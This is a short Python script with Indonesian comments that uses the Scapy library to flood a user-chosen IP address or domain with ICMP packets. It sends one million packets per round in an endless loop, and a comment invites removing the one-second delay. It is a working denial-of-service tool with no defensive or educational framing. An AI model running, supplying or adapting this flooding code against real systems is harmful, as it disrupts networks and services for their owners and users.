from scapy.all import IP, ICMP, send
import time

# Konfigurasi
target_ip = input("Masukkan IP atau domain target: ")
packet = IP(dst=target_ip)/ICMP()

# Fungsi mengirim 1 juta packet sekaligus
def send_one_million_packets():
    print("Mengirim 1.000.000 packet ICMP...")
    send(packet, count=1000000, verbose=0)
    print("Selesai.")

# Loop tanpa batas waktu
while True:
    send_one_million_packets()
    time.sleep(1)  # bisa diatur lebih kecil atau dihapus total